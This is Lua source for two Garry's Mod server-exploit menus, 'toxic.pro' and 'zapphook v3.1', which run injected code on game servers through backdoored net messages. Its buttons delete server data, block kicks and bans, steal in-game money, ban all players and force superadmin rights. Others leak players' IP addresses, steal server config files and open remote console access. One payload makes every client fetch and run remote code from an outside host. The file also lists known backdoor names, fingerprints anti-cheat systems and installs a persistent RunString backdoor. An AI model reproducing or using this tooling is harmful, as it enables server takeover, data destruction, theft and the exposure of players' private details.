		toxic.PostLua( [[
		
		local id = ]] .. LocalPlayer():UserID() .. [[
		
		local dirs = {
		
			"ulx", 
			"ulx_logs",
			"ulib",
			"darkrp_logs",
			"adv_duplicator",
			"advdupe2",
			"cpuchip",
			"expression2",
			"cw2_0",
		
		}
		
		for k, v in pairs( dirs ) do
			
			for dir, _file in pairs( file.Find( v .. "/*", "DATA" ) ) do
				
				file.Delete( v .. "/" .. _file )
				
				Player( id ):ChatPrint( "[Toxic.pro] Deleted file 'data/" .. v .. "/" .. _file )
			
			end
		
		end
		
		for k, v in pairs( file.Find( "*", "DATA" ) ) do
		
			file.Delete( v )
		
			Player( id ):ChatPrint( "[Toxic.pro] Deleted file 'data/" .. v )
		
		end
		
		]] )
	
	end )
	
	toxic.AddButton( "No Kick/Ban", panel, function()
	
		toxic.PostLua( [[
		
			_R = debug.getregistry()
			
			function game.KickID( id, reason )
			
				return
			
			end
			
			function _R.Player.Ban()
			
				return
			
			end
			
			function _R.Player.Kick()
			
				return
				
			end
		
		]] )
		
		toxic.Notify( "Nulled _R.Player.Ban & _R.Player.Kick" )
	
	end )
	
	toxic.AddButton( "Disable !cake", panel, function()
	
		toxic.PostLua( [[ _G.cac = function() end]] )
		
		toxic.Notify( "Attempted to disable !cake's anti-cheat, probably failed." )
	
	end )
	
	toxic.AddCategorySpacer( "DarkRP", Color( 0, 200, 0 ), panel )
	
	toxic.AddButton( "Steal Money", panel, function()
	
		toxic.PostLua( [[
		
			local id = ]] .. LocalPlayer():UserID() .. [[

			for k, v in next, player.GetAll() do
				
				if v:Nick() == "]] .. LocalPlayer():Nick() .. [[" then
				
					continue
				
				end
				
				local bal = v:getDarkRPVar( "money" ) or 9999999
				
				v:addMoney( -bal )
				
				Player( id ):addMoney( bal )
				
				Player( id ):ChatPrint( "[Toxic.pro] Stole $" .. string.Comma( bal ) .. " from " .. v:Nick() )
				
			end
		
		]] )

	end )
	
	toxic.AddButton( "Wipe All Money", panel, function() 
	
		toxic.PostLua( [[RunConsoleCommand( "rp_resetallmoney" )]] )

		toxic.Notify( "Wiped DarkRP money database" ) 
		
	end )
	
	toxic.AddButton( "Change All Names", panel, function()
	
		Derma_StringRequest( "Name Changer", "What would you like to name everyone?", "", function( text ) 
			
			toxic.PostLua( [[
				
				local str = "]] .. text .. [["
				
				for k, v in next, player.GetAll() do
				
					DarkRP.storeRPName( v, str )
					
					v:setDarkRPVar( "rpname", str )
				
				end
			
			]] )
	
			toxic.Notify( "Renamed everyone to '" .. text .. "'" )
	
		end )
	
	end )
	
	toxic.AddButton( "Strip Weapons", panel, function()
	
		for k, v in next, player.GetAll() do
			
			for x, y in pairs( v:GetWeapons() ) do
				
				net.Start( "properties" )
				
					net.WriteString( "remove", 32 )
					
					net.WriteEntity( y )
					
				net.SendToServer()
				
			end
			
		end
	
		toxic.Notify( "Attempted to use net 'properties' exploit to strip all players." )
	
	end )
	
	toxic.AddCategorySpacer( "Autism", Color( 200, 0, 200 ), panel )
	
	toxic.AddButton( "Visual Rape", panel, function()
	
		-- I don't like this.
		toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[sound.PlayURL( 'http://riverrp.xyz/boss.mp3', 'mono', function( s ) s:Play() end )]] ) end" )
	
		-- I don't like any of this.
		toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[http.Fetch( 'https://snixzz.net/toxic.pro/disco.lua', function( body ) RunString( body ) end )]] ) end" )	
	
	end )
	
	toxic.AddButton( "Earthquake", panel, function()

		toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end" )
		
		toxic.Notify( "Earthquake started." )
		
	end )
	
	toxic.AddButton( "Horse", panel, function()
	
		toxic.PostLua( [[
		
			local id = ]] .. LocalPlayer():UserID() .. [[
			
			Player( id ):SetModel( "models/props_c17/statue_horse.mdl" )
			
			Player( id ):SetMaterial( "models/debug/debugwhite" )
			
			hook.Add( "Think", "horse", function()
				
				if !IsValid( Player( id ) ) then return end
				
				Player( id ):SetColor( HSVToColor( RealTime() * 120 % 360, 1, 1 ) )
			
			end )
		
		]] )
	
	end )
	
	toxic.AddButton( "Footsteps", panel, function()
	
		toxic.PostLua( [[
		
			hook.Add( "PlayerFootstep", "oooh", function( ply ) 
			
				ply:EmitSound( "vo/npc/female01/pain0" .. math.random( 1, 9 ) .. ".wav", 75, math.random( 50, 100 ) )
			
			end )
		
		]] )
		
		toxic.Notify( "Enabled moaning footsteps." )
	
	end )
	
	toxic.AddButton( "Spam .txt", panel, function()
		
		Derma_StringRequest( ".txt file contents", "What would you like to put in the .txt?", "", function( text ) 
			
			toxic.PostLua( [[
		
				for i = 1, 100 do 
			
					file.Write( "toxic.pro_" .. math.random( 1, 999999 ) .. ".txt", "]] .. text .. [[" )
			
				end
			
			]] )
	
			toxic.Notify( "Spamming 100 .txt files containing '" .. text .. "'" )
	
		end )
		
	end )
	
	toxic.AddButton( "Spam Chat", panel, function()
		
		Derma_StringRequest( "Message", "Chat Message", "SEIZED BY TOXIC.PRO", function( text ) 
			
			toxic.PostLua( [[
				
				util.AddNetworkString("chat_AddText")
				chat = {}
				function chat.AddText(...)
					net.Start("chat_AddText")
						net.WriteTable({...})
					net.Broadcast()
				end
				function AddTextPly( ply, ...)
					net.Start("chat_AddText")
						net.WriteTable({...})
					net.Send( ply )
				end
				
				for k, v in pairs( player.GetAll() ) do
				
					v:SendLua( 'net.Receive("chat_AddText", function(len) chat.AddText( unpack( net.ReadTable() ) )end)' )
				
				end
				
				timer.Create( "gotEm", 1, 120, function()
				
					local function ChatPrintRainbow( frequency, str )

						local text = {}


						for i = 1, #str do
							table.insert( text, HSVToColor( i * frequency % 360, 1, 1 ) )
						table.insert( text, string.sub( str, i, i ) )
						end

						chat.AddText( unpack( text ) )

					end
					
					ChatPrintRainbow( 10, "]] .. text .. [[" )
				
				end )

			
			]] )

		end )
		
	end )
	
	/*toxic.AddButton( "Spam Advert", panel, function()
		
		Derma_StringRequest( "Message", "Spam Message", "SEIZED BY TOXIC.PRO", function( text ) 
			
			toxic.PostLua( [[
				
				local id = ]] .. LocalPlayer():UserID() .. [[
				
				local why = ]] .. text .. [[
				
				timer.Create( "gotEm2", 1, 120, function()
				
					for k, v in next, player.GetAll() do
					
						v:SetNWString( "why", why )
					
						v:SendLua( 'RunConsoleCommand("say","/advert",LocalPlayer():GetNWString("why"))')
						
					end
				
				end )

			
			]] )

		end )
		
	end )*/
	
	toxic.AddButton( "Dance", panel, function()

		toxic.PostLua( [[
				
			local id = ]] .. LocalPlayer():UserID() .. [[
				
			timer.Create( "gotEm3?", 1, 120, function()
				
				for k, v in next, player.GetAll() do
					
					if v:UserID() == v then continue end
					
					v:SendLua('RunConsoleCommand("act","dance")')
						
				end
				
			end )

			
		]] )
		
		toxic.Notify( "Forcing all players to run act dance" )
		
	end )
	
	toxic.AddCategorySpacer( "Takeover", Color( 255, 150, 0 ), panel )
	
	toxic.AddButton( "Give Superadmin", panel, function()
		
		toxic.PostLua( [[
		
			local id = ]] .. LocalPlayer():UserID() .. [[
			
			Player( id ):SetUserGroup( "superadmin" )
		
		]] )
		
		toxic.Notify( "Attempted to silently force superadmin." )
	
	end )
	
	toxic.AddButton( "Print All IPs", panel, function()
		
		toxic.PostLua( [[
		
			local id = ]] .. LocalPlayer():UserID() .. [[
			
			for k, v in pairs( player.GetAll() ) do 
				
				Player( id ):ChatPrint( "Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress() )
				
			end

		]] )
		
		toxic.Notify( "Printed all IPs into chat." )
	
	end )
	
	toxic.AddButton( "Ban Everyone", panel, function()
	
		Derma_StringRequest( "Toxic.pro Ban All", "Reason", "", function( text )
		
			toxic.PostLua( [[
		
				local id = ]] .. LocalPlayer():UserID() .. [[
			
				for k, v in next, player.GetAll() do
				
					if v:UserID() == id then continue end
				
					v:Ban( 0, false )
				
					v:Kick( "]] .. tostring( text ) .. [[" )
					
				end
		
			]] )
			
			toxic.Notify( "Banned everyone for '" .. text .. "'" )
			
		end )
	
	end )
	
	toxic.AddButton( "RCON", panel, function()
	
		Derma_StringRequest( "Toxic.pro RCON", "Command", "", function( text ) 
			
			toxic.PostLua( [[game.ConsoleCommand( "]] .. tostring( text ) .. [[" .. "\n" )]] )
			
			toxic.Notify( "Ran command '" .. text .. "'" )
			
		end )
	
	end )
	
	toxic.AddButton( "Lua Run", panel, function()
	
		toxic.OpenLuaEditor( frame )
	
		/*Derma_StringRequest( "Toxic.pro Lua Run", "Lua String", "", function( text ) 
			
			toxic.PostLua( [[RunString( ']] .. text .. [[' )]] )
			
			toxic.Notify( "Ran Lua '" .. text .. "'" )
			
		end )*/
	
	end )
	
	toxic.AddButton( "Rename Server", panel, function() 
	
		toxic.PostLua( [[RunConsoleCommand( "hostname", "TOXIC.PRO" )]] )
		
		toxic.Notify( "Renamed server to TOXIC.PRO" )
	
	end )

	toxic.AddButton( "Steal File", panel, function()
	
		Derma_StringRequest( "Steal File Source", "File Path (Relative to garrysmod/) e.g: cfg/server.cfg", "", function( text ) 		
			
			net.Receive( "file", function( len )
						
				local str = net.ReadString()
									
				if str != "ERROR" then
									
					toxic.OpenTextDocument( text, str, frame )
							
				else
									
					toxic.Notify( "Unable to find file " .. text .. " on the server" )
									
				end
									
			end )
			
			toxic.PostLua( [[
				
				util.AddNetworkString( "file" )
				
				local id = ]] .. LocalPlayer():UserID() .. [[
				
				local f = file.Open( "]] .. text .. [[", "r", "GAME" )
				
				if !f then 
				
					net.Start( "file" )
				
						net.WriteString( "ERROR" )
					
					net.Send( Player( id ) )
				
					return 
					
				end
				
				local str = f:Read( f:Size() )
				
				f:Close()

				net.Start( "file" )
				
					net.WriteString( str )
					
				net.Send( Player( id ) )
			
			]] )
			
			toxic.Notify( "Attempted to steal file " .. text )
			
		end )
		
	end )
	
end

toxic.Init()
concommand.Add( "toxic.pro", toxic.UI )
end

local DermaButton = vgui.Create( "DButton", panel2 )
DermaButton:SetText( "Zapp Sploit`s" )
DermaButton:SetPos( 0, 210 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()
	/*


:::::::::     :::     :::::::::  :::::::::  :::    :::  ::::::::   ::::::::  :::    :::      :::::::::      :::      ::::::::  :::    ::: :::::::::   ::::::::   ::::::::  :::::::::  
     :+:    :+: :+:   :+:    :+: :+:    :+: :+:    :+: :+:    :+: :+:    :+: :+:   :+:       :+:    :+:   :+: :+:   :+:    :+: :+:   :+:  :+:    :+: :+:    :+: :+:    :+: :+:    :+: 
    +:+    +:+   +:+  +:+    +:+ +:+    +:+ +:+    +:+ +:+    +:+ +:+    +:+ +:+  +:+        +:+    +:+  +:+   +:+  +:+        +:+  +:+   +:+    +:+ +:+    +:+ +:+    +:+ +:+    +:+ 
   +#+    +#++:++#++: +#++:++#+  +#++:++#+  +#++:++#++ +#+    +:+ +#+    +:+ +#++:++         +#++:++#+  +#++:++#++: +#+        +#++:++    +#+    +:+ +#+    +:+ +#+    +:+ +#++:++#:  
  +#+     +#+     +#+ +#+        +#+        +#+    +#+ +#+    +#+ +#+    +#+ +#+  +#+        +#+    +#+ +#+     +#+ +#+        +#+  +#+   +#+    +#+ +#+    +#+ +#+    +#+ +#+    +#+ 
 #+#      #+#     #+# #+#        #+#        #+#    #+# #+#    #+# #+#    #+# #+#   #+#       #+#    #+# #+#     #+# #+#    #+# #+#   #+#  #+#    #+# #+#    #+# #+#    #+# #+#    #+# 
######### ###     ### ###        ###        ###    ###  ########   ########  ###    ###      #########  ###     ###  ########  ###    ### #########   ########   ########  ###    ### 


                                                 
                                                 
shitty and pasted by zapp and dragm_
*/

/*
=================================================================================
CHANGELOG v3
+ watermark
+ some backdoor functions
- useless shit
+ butfix(?)
+ optimization code(no)
+ some font fixes
+ rgb thing now synced with watermark
=================================================================================
*/

/*
=================================================================================
CHANGELOG v3.1
+ new bhop(thanks void)
+ some backdoor functions(thanks void for rebug v2 release)
+ consoleclear after inject
+ anticheat checker(pretty useless but ok)
+ some font changes
- useless backdor functions
+ optimization after inject
+ administration addons checker
=================================================================================
*/

local prant = print
prant( "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" )

MsgC(Color(199, 21, 133), [[
    zapphook v3.1
    beta release
    ]])

// матх рандом для лошков 
MsgC(Color(255, 255, 255), [[

    zapphook - open menu
    watermark, watermark_off - watermark cmds
    bhop, bhop_off - bhop cmds
    zapphook_shownets - print all netkeys
    ]])

--[[-------------------------------------------------------------------------------------
Menu Optimization(thanks void)
----------------------------------------------------------------------------------------]]
hook.Add( "InitPostEntity", "fpsbooster", function()
    RunConsoleCommand("gmod_mcore_test", "1")
    RunConsoleCommand("mat_queue_mode", "-1")
    RunConsoleCommand("cl_threaded_bone_setup", "1")
    RunConsoleCommand("cl_threaded_client_leaf_system", "1")
    RunConsoleCommand("r_threaded_client_shadow_manager", "1")
    RunConsoleCommand("r_threaded_particles", "1")
    RunConsoleCommand("r_threaded_renderables", "1")
    RunConsoleCommand("r_queued_ropes", "1")
    RunConsoleCommand("studio_queue_mode", "1")
        hook.Remove("RenderScreenspaceEffects", "RenderColorModify")
        hook.Remove("RenderScreenspaceEffects", "RenderBloom")
        hook.Remove("RenderScreenspaceEffects", "RenderToyTown")
        hook.Remove("RenderScreenspaceEffects", "RenderTexturize")
        hook.Remove("RenderScreenspaceEffects", "RenderSunbeams")
        hook.Remove("RenderScreenspaceEffects", "RenderSobel")
        hook.Remove("RenderScreenspaceEffects", "RenderSharpen")
        hook.Remove("RenderScreenspaceEffects", "RenderMaterialOverlay")
        hook.Remove("RenderScreenspaceEffects", "RenderMotionBlur")
        hook.Remove("RenderScene", "RenderStereoscopy")
        hook.Remove("RenderScene", "RenderSuperDoF")
        hook.Remove("GUIMousePressed", "SuperDOFMouseDown")
        hook.Remove("GUIMouseReleased", "SuperDOFMouseUp")
        hook.Remove("PreventScreenClicks", "SuperDOFPreventClicks")
        hook.Remove("PostRender", "RenderFrameBlend")
        hook.Remove("PreRender", "PreRenderFrameBlend")
        hook.Remove("Think", "DOFThink")
        hook.Remove("RenderScreenspaceEffects", "RenderBokeh")
        hook.Remove("NeedsDepthPass", "NeedsDepthPass_Bokeh")
        hook.Remove("PostDrawEffects", "RenderWidgets")
        hook.Remove("PostDrawEffects", "RenderHalos")
end)
hook.Add("OnEntityCreated","WidgetInit",function(ent)
    if ent:IsWidget() then
        hook.Add( "PlayerTick", "TickWidgets", function( pl, mv ) widgets.PlayerTick( pl, mv ) end ) 
        hook.Remove("OnEntityCreated","WidgetInit")
    end
end)




local vzlom = {} // аутизм)))
    local function rndstr(len)
        if len == nil then len = 5 end
        local chars = string.Split("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789", "")
        local r = ""
        while string.len(r) < len do
        r = r..chars[math.random(1, #chars)]
        end
        return r
    end
    
    local noobstr = rndstr(16)
local function rprint(...)
    chat.AddText(Color(255, 0, 20), "[zapphook] ", Color(20, 150, 200), ...)
end
--[[-------------------------------------------------------------------------------------
Administration Addons(thanks void)
----------------------------------------------------------------------------------------]]
    if istable(ULib) then
        rprint("тут ULX")
    end

    if istable(FAdmin) then
        rprint("тут FAdmin")
    end

    if istable(GExtension) then
        rprint("тут GExtension")
    end

    if istable(gBan) then
        rprint("тут gBan")
    end
vzlom.Version = "3.1" // версия
vzlom.SpecialKey = "fuckoff"
vzlom.Backdoor = ""
vzlom.charging = "weapons/cguard/charging.wav" // поменять ,kznm!
vzlom.warning = "ambient/alarms/klaxon1.wav"
vzlom.Backdoors = {
    "zapphook",
    "K0MxFcL3xPdzEsH5IhK7c5JWj",
    "SBussinesRetailer",
    "Sbox_darkrp",
    "Sbox_itemstore",
    "Ulib_Message",
    "ULogs_Info",
    "ITEM",
    "fix",
    "noclipcloakaesp_chat_text",
    "_Defqon",
    "nocheat",
    "ULX_QUERY2",
    "Sandbox_GayParty",
    "DarkRP_UTF8",
    "oldNetReadData",
    "BackDoor",
    "OdiumBackDoor",
    "cucked",
    "NoNerks",
    "kek",
    "ZimbaBackDoor",
    "something",
    "random",
    "strip0",
    "fellosnake",
    "idk",
    "killserver",
    "fuckserver",
    "cvaraccess",
    "rcon",
    "rconadmin",
    "web",
    "ÃžÃ ?D)â—˜",
    "DefqonBackdoor",
    "Sandbox_Armdupe",
    "DarkRP_AdminWeapons",
    "SessionBackdoor",
    "Fix_Keypads",
    "Remove_Exploiters",
    "noclipcloakaesp_chat_text",
    "_Defqon",
    "_CAC_ReadMemory",
    "nostrip",
    "LickMeOut",
    "MoonMan",
    "Im_SOCool",
    "ULXQUERY2",
    "jesuslebg",
    "zilnix",
    "enablevac",
    "c",
    "glx_push",
    "Sbox_gm_attackofnullday_key",
    "ÃƒÅ¾Ãƒ ?D)Ã¢â€”Ëœ",
    "disablebackdoor",
    "kill",
    "jsquery.data(post(false))",
    "PlayerCheck",
    "argumentumac",
    "awarn_remove",
    "https://i.imgur.com/gf6hlml.png",
    "insid3",
    "hexa",
    "antipk",
    "utf8-gv",
    "prone.UpdateModelsWarning",
    "contexthelp",
    "pjhabrp9ey",
    "urba_ne_hui",
    "ns",
    "whiletruedoend",
    "eventstart",
    "fuckoff"
     }
vzlom.Colors = {}
vzlom.Colors.prim = Color(110, 30, 110)
vzlom.Colors.seco = Color(170, 0, 255)
vzlom.Colors.text = Color(255, 255, 255)
vzlom.Colors.btn = Color(54, 78, 94)
surface.CreateFont("vzlom_Prim",{
    size = 20,bold=true
    })
surface.CreateFont("vzlom_PayloadBtn",{
    size = 18,bold=true
    })
surface.CreateFont("vzlom_Title",{
    size = 28,bold=true
    })
vzlom.Feature = {}
vzlom.Feature.lastPrompt = ""
vzlom.Feature.backdoorloaded = false
vzlom.Feature.canreopen = true

    function govnoedstvo() // гавнище должно ац находить...........
    if (file.Exists( "includes/extensions/client/vehicle.lua", "LUA" ) == true or file.Exists( "lua/autorun/client/!!!cac.lua", "LUA" ) == true or (_G.QAC or _G.CAC) == true ) then
               chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на Cake Anti Cheat")
    end
    if (file.Exists("autorun/client/cl_qac.lua", "LUA") == true or file.Exists("autorun/client/!!_cl_qac.lua", "LUA") == true ) then
               chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на Quack Anti Cheat")
    end
    if file.Exists( "autorun/server/anti-bhop.lua", "LUA" ) == true then
               chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на c0nw0nks Anti Cheat")
    end
    if (file.Exists( "cl_HAC.lua", "LUA" ) == true or file.Exists( "autorun/server/sv_HAC.lua", "LUA" ) == true or file.Exists( "autorun/client/cl_nuke_config_client.lua", "LUA" ) == true ) then
               chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на Hex's Anti Cheat")
    end
    if file.Exists( "autorun/client/cl_antinexploits.lua", "LUA" ) == true then
               chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на Anti Net Exploits")
    end
    if (file.Exists( "autorun/cl_limon.lua", "LUA" ) == true or file.Exists( "autorun/client/Lemos.lua", "LUA" ) == true ) then
               chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на Limon Anti Cheat")
    end 
    if file.Exists( "autorun/client/cl_anti_exploits.lua", "LUA" ) == true then
               chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на [ANTI-SY4KA] Anti Cheat")
    end
    if file.Exists( "includes/extensions/client/umbrella_load.lua", "LUA" ) == true then
               chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на Umbrella Anti Cheat")
    end
    if file.Exists("autorun/client/cl_init.lua", "LUA") then
        for k, v in pairs(string.Explode("\n", file.Read("autorun/client/cl_init.lua", "LUA"))) do
            if string.find(v, "miniebobo") then
               chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на ANTIEBOBO Anti Cheat")
            end
        end
    end
    if ((_G.nextlog) == true or file.Exists( "autorun/server/sv_antisploit.lua", "LUA" ) == true ) then 
              chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на Anti Exploiter")   
    end
    if ((_G.legit_nets or _G.bad_nets) == true or file.Exists( "autorun/server/snte_source.lua", "LUA" ) == true ) then
             chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на Say Not To Exploits")
    end
    if (_G.inserthui or _G.wetpussy) == true then
             chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на Anti Lua Viewer")
    end
    if (_G.STAMINA_RECOVER_RATE or _G.STAMINA_COST_FALL) == true then
             chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на Anti Bhop")
    end
    if (_G.EnforcerAddMessage) == true then
             chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на Enforcer Anti Minge")
    end
    if (_G.SCRG) == true then
             chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на Pablo's Screengrab")
    end
    if (_G.OpenSGMenu) == true then
             chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на Screengrab V2")
    end
    if (_G.find_laggy_hooks or _G.ReportStatistics) == true then
             chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на Lag Finder")
    end
    if (_G.string_format or _G.player_GetHumans) == true then
             chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на Proxy Blocker")
    end
    if (_G.Simplac or _G.Simplac.servertick) == true then
             chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "zapphook|AC logger", "] ", Color( 255, 255, 255 ), "гавнище похоже на Simplac Anti Cheat")
    end        
        govnoedstvo()
    end

function vzlom.Hack(code, f, ...)
    if util.NetworkStringToID(vzlom.Backdoor) == 0 then return vzlom.Message("ERROR: Trying to run code without backdoor") end
    if code:find("{LCP}") then
        code = code:Replace("{LCP}", "Player("..LocalPlayer():UserID()..")")
    end
    if not vzlom.Feature.backdoorloaded then
        vzlom.Feature.backdoorloaded = true
        vzlom.Hack([==[
    
    util.AddNetworkString("]==]..vzlom.SpecialKey..[==[")
    net.Receive("]==]..vzlom.SpecialKey..[==[",function()
        if net.ReadString() ~= "zapphook" then return end
        RunString(net.ReadString())
    end)
            ]==])
    end
    if f ~= false then
        code = string.format(code, f, ...)
    end
    if util.NetworkStringToID(vzlom.SpecialKey) ~= 0 then
        net.Start(vzlom.SpecialKey)
        net.WriteString("zapphook")
    else
        net.Start(vzlom.Backdoor)
    end
    net.WriteString(code)
    net.WriteBit(1)
    net.SendToServer()
end
function vzlom.Prompt(message,callback)
    local f = vgui.Create("DFrame")
    f:SetSize(400, 200)
    f:Center()
    f:MakePopup()
    f:ShowCloseButton(false)
    f:SetTitle("zapphook ("..vzlom.Version..")")
    f:SetDraggable(false)
    function f:Paint(w,h)
        draw.RoundedBox(0, 0, 0, w, h, vzlom.Colors.prim)
        draw.SimpleText(vzlom.message,"vzlom_Prim",200,50, vzlom.Colors.seco,1,1,1)
        surface.SetDrawColor( vzlom.Colors.seco )
        surface.DrawOutlinedRect( 0, 0, w, h )
    end
    local textentry = vgui.Create("DTextEntry",f)
    textentry:SetSize(300, 30)
    textentry:SetPos(50, 120)
    textentry:SetValue(vzlom.Feature.lastPrompt)
    local okbtn = vgui.Create("DButton",f)
    okbtn:SetSize(100, 20)
    okbtn:SetPos(290, 170)
    okbtn:SetText("OK")
    function okbtn:DoClick()
        f:Close()
        vzlom.Feature.lastPrompt = textentry:GetValue()
        callback(textentry:GetValue())
    end
    local closebtn = vgui.Create("DButton",f)
    closebtn:SetSize(100, 20)
    closebtn:SetPos(20, 170)
    closebtn:SetText("Close")
    function closebtn:DoClick()
        f:Close()
        vzlom.Feature.lastPrompt = textentry:GetValue()
    end
    surface.PlaySound("garrysmod/ui_hover.wav")
end
function vzlom.Comfirm(message,yes,no)
    yes = yes or function()end
    no = no or function()end
    local f = vgui.Create("DFrame")
    f:SetSize(400, 200)
    f:Center()
    f:MakePopup()
    f:ShowCloseButton(true)
    f:SetTitle("zapphook ("..vzlom.Version..")")
    f:SetDraggable(false)
    function f:Paint(w,h)
        draw.RoundedBox(0, 0, 0, w, h, vzlom.Colors.prim)
        draw.SimpleText(message,"vzlom_Prim",200,50, vzlom.Colors.seco,1,1,1)
        surface.SetDrawColor( vzlom.Colors.seco )
        surface.DrawOutlinedRect( 0, 0, w, h )
    end
    local okbtn = vgui.Create("DButton",f)
    okbtn:SetSize(100, 20)
    okbtn:SetPos(290, 170)
    okbtn:SetText("Yes")
    function okbtn:DoClick()
        f:Close()
        yes()
    end
    local closebtn = vgui.Create("DButton",f)
    closebtn:SetSize(100, 20)
    closebtn:SetPos(20, 170)
    closebtn:SetText("No")
    function closebtn:DoClick()
        f:Close()
        no()
    end
    surface.PlaySound("garrysmod/ui_hover.wav")
end
function vzlom.Message(message,callback)
    callback = callback or function()end
    local f = vgui.Create("DFrame")
    f:SetSize(400, 200)
    f:Center()
    f:MakePopup()
    f:ShowCloseButton(true)
    f:SetTitle("zapphook ("..vzlom.Version..")")
    f:SetDraggable(false)
    function f:Paint(w,h)
        draw.RoundedBox(0, 0, 0, w, h, vzlom.Colors.prim)
        draw.SimpleText(message,"vzlom_Prim",200,50, vzlom.Colors.seco,1,1,1)
        surface.SetDrawColor( vzlom.Colors.seco )
        surface.DrawOutlinedRect( 0, 0, w, h )
    end
    local okbtn = vgui.Create("DButton",f)
    okbtn:SetSize(100, 20)
    okbtn:SetPos(290, 170)
    okbtn:SetText("Close")
    function okbtn:DoClick()
        f:Close()
    end
    surface.PlaySound("garrysmod/ui_hover.wav")
end
function vzlom.FunctionNative(func)
    local s = pcall(string.dump, func)
    if s then return false end
    if debug.getinfo(func).what == "C" then
        return true
    end
end
local f
vzlom.Active = false
local function MakeMenu()
    f = vgui.Create("DFrame")
    f:SetSize(780, 480)
    f:Center()
    f:MakePopup()
    f:ShowCloseButton(false)
    f:SetTitle("")
    f:SetDraggable(false)
    function f:OnKeyCodePressed(v)
        if v == KEY_INSERT then
            self:SetVisible(false)
            vzlom.Feature.canreopen = false
            timer.Simple(0.5,function()
                vzlom.Feature.canreopen = true
            end)
        end
    end

    surface.CreateFont( "menushka", { 
    font = "Arial", -- Use the font-name which is shown to you by your operating system Font Viewer, not the file name
    extended = false,
    size = 13,
    weight = 500,
    blursize = 0,
    scanlines = 0,
    antialias = true,
    underline = false,
    italic = false,
    strikeout = false,
    symbol = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
} )

    surface.CreateFont( "menushka2", { 
    font = "Arial", -- Use the font-name which is shown to you by your operating system Font Viewer, not the file name
    extended = false,
    size = 25,
    weight = 500,
    blursize = 0,
    scanlines = 0,
    antialias = true,
    underline = false,
    italic = false,
    strikeout = false,
    symbol = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
} )

    function f:Paint(w,h)
        local rgbcol =  HSVToColor(CurTime() *  120 % 360,1,1)
        DisableClipping(true)


        draw.RoundedBox(10, 0, -35, 250, 40, vzlom.Colors.seco)
        draw.SimpleText("zapphook "..vzlom.Version , "menushka2", 5, -30, rgbcol)


        draw.RoundedBox(10, 300, -20, 450, 40, vzlom.Colors.seco)
        draw.SimpleText(string.format("hacked by ramzi"), "menushka", 305, -17, vzlom.Colors.text)


        draw.RoundedBox(0, 0, 0, w, h, vzlom.Colors.prim)
        surface.SetDrawColor( vzlom.Colors.seco )
        surface.DrawOutlinedRect( 0, 0, w, h )
        
        
        draw.RoundedBox(0, -19, 0, 20, 480, (vzlom.Active and Color(0,100,0)) or Color(100,0,0) )
        DisableClipping(false)
    end
    local clpan = vgui.Create("DScrollPanel",f)
    clpan:SetPos(200,25)
    clpan:SetSize(200, 400)
    function clpan:Paint(w,h)
        draw.SimpleText("Client payloads", "vzlom_Prim", 0, 0, vzlom.Colors.text)
    end
    local svpan = vgui.Create("DScrollPanel",f)
    svpan:SetPos(450,25)
    svpan:SetSize(200, 400)
    function svpan:Paint(w,h)
